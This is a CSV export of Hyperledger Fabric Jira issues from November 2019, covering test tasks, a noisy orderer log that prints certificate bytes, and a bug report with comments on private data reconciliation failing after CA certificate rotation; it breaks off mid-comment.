Summary,Issue key,Issue id,Parent id,Issue Type,Status,Project key,Project name,Project type,Project lead,Project description,Project url,Priority,Resolution,Assignee,Reporter,Creator,Created,Updated,Last Viewed,Resolved,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Fix Version/s,Fix Version/s,Fix Version/s,Fix Version/s,Component/s,Component/s,Component/s,Component/s,Component/s,Component/s,Component/s,Component/s,Due Date,Votes,Labels,Labels,Labels,Labels,Labels,Description,Environment,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Original Estimate,Remaining Estimate,Time Spent,Work Ratio,Σ Original Estimate,Σ Remaining Estimate,Σ Time Spent,Security Level,Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Inward issue link (Cloners),Inward issue link (Cloners),Outward issue link (Cloners),Inward issue link (Duplicate),Inward issue link (Duplicate),Outward issue link (Duplicate),Outward issue link (Duplicate),Inward issue link (Issue split),Outward issue link (Issue split),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Custom field (Authorized Watchers),Custom field (Business Value),Custom field (Commit Levels),Custom field (Current Status),Custom field (Design),Custom field (Design Status),Custom field (Documentation Impact),Custom field (Documentation Status),Custom field (Epic Color),Custom field (Epic Link),Custom field (Epic Name),Custom field (Epic Status),Custom field (Executed),Custom field (Found in Commit),Custom field (Function Test Status),Custom field (Must Fix),Custom field (Original story points),Custom field (Parent Link),Custom field (Rank),Custom field (Release Note),Custom field (Release Note Required),Custom field (Root Cause Analysis),Custom field (SDK Impact),Custom field (Sample/Tutorial),Sprint,Custom field (Steps to Reproduce),Custom field (Story Points),Custom field (System Test Impact),Custom field (Target end),Custom field (Target start),Custom field (Team),Custom field (Team),Custom field (Test Plan),Custom field (Test Result),Custom field (Test Result Details),Custom field (Test Type),Custom field (Triaged),Custom field (Usage),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Workaround),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitCommitsReferenced),Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment
Add map_private chaincode to fabric-test/chaincodes,FAB-17051,43282,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,bharadwajambati1,bharadwajambati1,12/Nov/19 3:53 AM,12/Nov/19 5:11 AM,28/Oct/23 3:09 AM,12/Nov/19 5:06 AM,v1.4.4,,,,,,,,,v1.4.4,,,,fabric-quality,,,,,,,,,0,,,,,,,,bharadwajambati1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzq",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-1.4,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Nov/19 3:55 AM;bharadwajambati1;[https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34328/];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cluster replication probe endpoint warning message spews a bunch of goo into the logs,FAB-17052,43283,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,sykesm,sykesm,12/Nov/19 4:30 AM,19/Nov/19 12:53 AM,28/Oct/23 3:09 AM,19/Nov/19 12:53 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-orderer,,,,,,,,,0,help-wanted,ipm,,,,"The block puller issues warning messages when probing endpoints fails. This message appears as goo to users.

{code}
		p.Logger.Warningf(""Could not connect to any endpoint of %v"", p.Endpoints)
{code}
results in
{code}
[33m2019-08-09 19:42:45.637 UTC [orderer.common.cluster.replication] connectToSomeEndpoint -> WARN 08b[0m Could not connect to any endpoint of [{127.0.0.1:37718 [[45 45 45 45 45 66 69 71 73 78 32 67 69 82 84 73 70 73 67 65 84 69 45 45 45 45 45 10 77 73 73 67 78 106 67 67 65 100 121 103 65 119 73 66 65 103 73 82 65 79 56 54 89 107 75 67 101 109 74 77 69 105 56 102 113 56 122 80 47 90 103 119 67 103 89 73 75 111 90 73 122 106 48 69 65 119 73 119 98 68 69 76 10 77 65 107 71 65 49 85 69 66 104 77 67 86 86 77 120 69 122 65 82 66 103 78 86 66 65 103 84 67 107 78 104 98 71 108 109 98 51 74 117 97 87 69 120 70 106 65 85 66 103 78 86 66 65 99 84 68 86 78 104 98 105 66 71 10 99 109 70 117 89 50 108 122 89 50 56 120 70 68 65 83 66 103 78 86 66 65 111 84 67 50 86 52 89 87 49 119 98 71 85 117 89 50 57 116 77 82 111 119 71 65 89 68 86 81 81 68 69 120 70 48 98 72 78 106 89 83 53 108 10 101 71 70 116 99 71 120 108 76 109 78 118 98 84 65 101 70 119 48 120 79 68 69 120 77 84 107 120 78 68 77 53 77 68 66 97 70 119 48 121 79 68 69 120 77 84 89 120 78 68 77 53 77 68 66 97 77 71 119 120 67 122 65 74 10 66 103 78 86 66 65 89 84 65 108 86 84 77 82 77 119 69 81 89 68 86 81 81 73 69 119 112 68 89 87 120 112 90 109 57 121 98 109 108 104 77 82 89 119 70 65 89 68 86 81 81 72 69 119 49 84 89 87 52 103 82 110 74 104 10 98 109 78 112 99 50 78 118 77 82 81 119 69 103 89 68 86 81 81 75 69 119 116 108 101 71 70 116 99 71 120 108 76 109 78 118 98 84 69 97 77 66 103 71 65 49 85 69 65 120 77 82 100 71 120 122 89 50 69 117 90 88 104 104 10 98 88 66 115 90 83 53 106 98 50 48 119 87 84 65 84 66 103 99 113 104 107 106 79 80 81 73 66 66 103 103 113 104 107 106 79 80 81 77 66 66 119 78 67 65 65 81 122 43 71 103 105 55 109 75 97 43 79 78 81 106 118 67 52 10 88 119 78 50 97 65 78 49 78 74 101 73 74 52 87 55 88 122 121 48 43 68 107 71 109 68 105 122 66 78 75 83 51 51 100 106 48 80 70 56 114 71 49 82 111 50 43 43 76 74 70 117 67 56 121 121 71 115 89 120 121 66 105 66 10 115 82 50 43 111 49 56 119 88 84 65 79 66 103 78 86 72 81 56 66 65 102 56 69 66 65 77 67 65 97 89 119 68 119 89 68 86 82 48 108 66 65 103 119 66 103 89 69 86 82 48 108 65 68 65 80 66 103 78 86 72 82 77 66 10 65 102 56 69 66 84 65 68 65 81 72 47 77 67 107 71 65 49 85 100 68 103 81 105 66 67 67 78 112 99 52 74 87 76 57 121 119 99 102 116 119 100 71 120 103 111 49 120 53 51 82 83 57 80 50 52 70 112 112 52 65 114 114 77 10 53 54 54 118 111 84 65 75 66 103 103 113 104 107 106 79 80 81 81 68 65 103 78 73 65 68 66 70 65 105 69 65 47 90 50 120 68 82 101 65 71 57 106 86 86 81 82 99 47 104 103 110 99 109 122 113 50 69 121 43 56 78 74 52 10 107 122 121 73 117 68 118 107 70 102 73 67 73 70 99 110 122 107 74 71 103 67 75 104 68 113 84 70 122 50 85 72 122 68 119 104 111 107 105 102 120 83 80 71 72 109 73 105 50 83 89 109 112 67 106 110 10 45 45 45 45 45 69 78 68 32 67 69 82 84 73 70 73 67 65 84 69 45 45 45 45 45 10]]}]
{code}

It seems we should be smarter about what we log. The byte slice that makes up the TLS root certificates should not be a set of numbers...",,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zo",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,yacovm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Nov/19 4:50 AM;yacovm;I'll take this;;;","12/Nov/19 5:04 AM;yacovm;https://gerrit.hyperledger.org/r/#/c/fabric/+/34336/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add  longer traffic load test in k8s system test in release-1.4 branch,FAB-17055,43290,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,12/Nov/19 7:31 PM,13/Nov/19 4:35 AM,28/Oct/23 3:09 AM,13/Nov/19 4:34 AM,v1.4.3,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"The linked bug occurred a little more than 3 hours into a 12 hour traffic run in a CI VM.
Running a longer test like this is already an objective in our k8s lab, and doing it soon could provide more info about that problem.

We can run single or multiple traffic tests, so long as we keep a single network up and running the entire time.",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16070,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16061,,,No,,Unset,No,,,"1|i014h7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Nov/19 4:35 AM;rameshthoomu;https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34343/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
K8s system test: Failed to send traffic in parallel with two instances for sbe_cc,FAB-17056,43293,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,bharadwajambati1,bharadwajambati1,13/Nov/19 1:34 AM,21/Nov/19 4:25 AM,28/Oct/23 3:09 AM,21/Nov/19 4:25 AM,v1.4.4,,,,,,,,,v1.4.4,,,,fabric-quality,,,,,,,,,0,,,,,,"After instantiating the sbe chaincode, pte is sending traffic using only one instance even though there were two.",,bharadwajambati1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzy",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,,,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Nov/19 2:05 AM;bharadwajambati1;[https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34433/];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Generate certificates for orderer/common/server tests,FAB-17057,43294,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,13/Nov/19 1:54 AM,13/Dec/19 12:30 AM,28/Oct/23 3:09 AM,13/Dec/19 12:30 AM,,,,,,,,,,v2.0.0,,,,fabric-orderer,,,,,,,,,0,help-wanted,,,,,"Similar to FAB-16704, we should generate the certificates needed for these tests instead of relying on fixtures. ",,denyeart,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8rvo",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wlahti,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Dec/19 9:11 AM;denyeart;https://gerrit.hyperledger.org/r/#/c/fabric/+/34367/ abandoned, need a GitHub PR;;;","06/Dec/19 1:44 AM;wlahti;[https://github.com/hyperledger/fabric/pull/373];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix port numbers issue in operator k8s,FAB-17058,43295,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,13/Nov/19 2:15 AM,15/Nov/19 4:25 AM,28/Oct/23 3:09 AM,15/Nov/19 4:25 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Fix port numbers issue in operator k8s,,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16240,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzc",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),suryalnvs,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-1.4,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Nov/19 4:24 AM;suryalnvs;https://gerrit.hyperledger.org/r/#/c/fabric-test/+/34349/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Private data reconciliation fails when CA certificates have been rotated,FAB-17059,43296,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,caod,silveraid,silveraid,13/Nov/19 3:46 AM,29/May/20 1:27 AM,28/Oct/23 3:09 AM,19/Feb/20 6:46 AM,v1.4.3,,,,,,,,,v1.4.5,v2.0.1,v2.1.0,,fabric-ledger,fabric-peer,,,,,,,,1,privatedata,,,,,"I have run into an issue which I think it is some form of bug in the private data reconciliation related to new CA certificates introduced on a network. Due to this bug private data created on a network before introducing the new CA certificates is not being synced over to peers which have their MSP created with the new CA certificates and newly joined to the network, however, any private data created after the new CA certificates are in place are syncing over without any problem.

There are only a few cases what I can think of when CA certificates may change, e.g.
 * the private key gets compromised and we are forced to be changed, or
 * the certificate just expires so we are forced to create new ones, or
 * the key is stored in an HSM and the CA needs to be migrated away from the HSM.

 

When the new peer joins to the network with the MSP id from the new CA the following messages can be observed which are probably related:
{noformat}
2019-11-12 15:40:14.234 UTC [committer.txvalidator] Validate -> INFO 3bd7 [mychannel] Validated block [67] in 1ms
2019-11-12 15:40:14.234 UTC [cauthdsl] deduplicate -> ERRO 3bd8 Principal deserialization failure (the supplied identity is not valid: x509: certificate signed by unknown authority) for identity 0
2019-11-12 15:40:14.234 UTC [gossip.privdata] listMissingPrivateData -> WARN 3bd9 Removed mycc mycollection hash 188afea30ec6d87091b1900f04a811c1cd4e84d4245ddfd9a4b45347b71b47dd from the data passed to the ledger
2019-11-12 15:40:14.258 UTC [kvledger] CommitWithPvtData -> INFO 3bda [mychannel] Committed block [67] with 1 transaction(s) in 23ms (state_validation=3ms block_and_pvtdata_commit=1ms state_commit=18ms) commitHash=[60fec85779c72be4670c72fe4ccde47b98ed99c4d18481acae155566f08f01fe]{noformat}",,ahmedsajid,ales,caod,denyeart,gbolo,hello2mao,manish-sethi,Senthil1,silveraid,yacovm,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17472,,,,,,"14/Nov/19 4:54 AM;silveraid;after_dlbp-org2.json;https://jira.hyperledger.org/secure/attachment/17928/after_dlbp-org2.json","14/Nov/19 4:54 AM;silveraid;after_testchainid.json;https://jira.hyperledger.org/secure/attachment/17929/after_testchainid.json","14/Nov/19 4:54 AM;silveraid;before_dlbp-org2.json;https://jira.hyperledger.org/secure/attachment/17930/before_dlbp-org2.json","14/Nov/19 4:54 AM;silveraid;before_testchainid.json;https://jira.hyperledger.org/secure/attachment/17931/before_testchainid.json","18/Nov/19 11:46 PM;silveraid;dlbp-org2_current_config.json;https://jira.hyperledger.org/secure/attachment/17946/dlbp-org2_current_config.json","16/Nov/19 7:21 AM;silveraid;net_b_peer1_debug.txt.gzaa;https://jira.hyperledger.org/secure/attachment/17933/net_b_peer1_debug.txt.gzaa","16/Nov/19 7:21 AM;silveraid;net_b_peer1_debug.txt.gzab;https://jira.hyperledger.org/secure/attachment/17934/net_b_peer1_debug.txt.gzab","16/Nov/19 7:21 AM;silveraid;net_b_peer1_debug.txt.gzac;https://jira.hyperledger.org/secure/attachment/17935/net_b_peer1_debug.txt.gzac","16/Nov/19 7:21 AM;silveraid;net_b_peer1_debug.txt.gzad;https://jira.hyperledger.org/secure/attachment/17936/net_b_peer1_debug.txt.gzad","18/Nov/19 11:20 PM;silveraid;org2netb_join_debug.txt.gz.aa;https://jira.hyperledger.org/secure/attachment/17942/org2netb_join_debug.txt.gz.aa","18/Nov/19 11:20 PM;silveraid;org2netb_join_debug.txt.gz.ab;https://jira.hyperledger.org/secure/attachment/17943/org2netb_join_debug.txt.gz.ab","18/Nov/19 11:20 PM;silveraid;org2netb_join_debug.txt.gz.ac;https://jira.hyperledger.org/secure/attachment/17944/org2netb_join_debug.txt.gz.ac","18/Nov/19 11:23 PM;silveraid;org2netb_join_debug.txt.gz.ad;https://jira.hyperledger.org/secure/attachment/17945/org2netb_join_debug.txt.gz.ad",,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwr6z:zz6x",,,,Unset,Unset,v1.4.x,"1. Setup a production like network with CA infrastructure (root and intermediates) for each organizations and some channels with private collections. (CA infrastructure may be replaced with cryptogen - has no relevance). Call this network A.
2. Create some private data on network A, confirm through couchdb queries that the private data is indeed there.
3. Setup a 2nd production network, called network B, which will use network A orderers (just to decrease complexity) with a new CA infrastructure or generate new crypto material with cryptogen for network B. The peers of network B will have their MSP issued by network B's CA infrastructure.
4. Update the system channel, and any other channels configuration by adding network B certificates, so that the channels will have all network A and network B root and intermediate CAs for all organizations.
5. Create some more private data on network A, confirm again through couchdb queries that your data has been created as expected.
6. Update anchor peer configuration by adding network B peers (which have not joined to any channels yet) to the list, it does not make any difference
7. Join to a channel which has private data with a network B peer, let the peer to sync up all of the blocks.
8. Inspect couchdb of the joined network B peer and note that it does not have any of the private data created in step 2, however, it has the private data which had been added at step 5.",,Unset,,,,,,Unset,,Unset,,(Please add usage information),ahmedsajid,ales,caod,denyeart,gbolo,hello2mao,manish-sethi,Senthil1,silveraid,yacovm,ymlbright,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Nov/19 4:45 AM;denyeart;[~silveraid] Does your network B peer come from an org with a new MSPID? Have you added the new MSPID to the collection configuration?;;;","13/Nov/19 5:04 AM;silveraid;Hi [~denyeart], the MSPID stays the same, just adding additional root and intermediate CA certificates into the respective arrays under the same MSPID. The configuration of the collection have not been touched.;;;","13/Nov/19 11:51 PM;yacovm;{quote}2019-11-12 15:40:14.234 UTC [cauthdsl] deduplicate -> ERRO 3bd8 Principal deserialization failure (the supplied identity is not valid: x509: certificate signed by unknown authority) for identity 0{quote}

Sounds like you didn't properly add the root CAs to the MSP config... can you upload your MSP config of the old config block and the latest config block?

Just upload the last config block and the one before the merge;;;","14/Nov/19 4:56 AM;silveraid;Hi [~yacovm], I am looking at this, but did not find anything, attached the before and current configuration of the system and channel. Collecting some debug output of cauthdsl or please let me know what should I turn into debug to collect further logs if needed.;;;","14/Nov/19 5:41 AM;yacovm;Is this happening in channel dblp ? And I don't understand why all the intermediate CAs have an OU of client ?;;;","14/Nov/19 6:35 AM;silveraid;Hi, yes the channel what I use is called 'dlbp-org2', the OU is 'client' because I set the type to client in the fabric CA config, I can fix that and redo the test.;;;","14/Nov/19 6:43 AM;yacovm;That won't solve the problem though... I was just curious. 

Can you perhaps locate the transaction of block 67 and put it here? If the data is private / confidential then you can send me via email (my username with suffix il dot ibm dot com);;;","14/Nov/19 10:18 PM;silveraid;I have wiped the original networks a dozen time already, and also changed the OU to 'ca', which did not make a difference as we expected. One thing what I have noticed just now that the first peer which joins to the network does not have the privdata log messages, even though it is also missing the private data.

So on the new peer1 I have the following message for block 10:
{code:java}
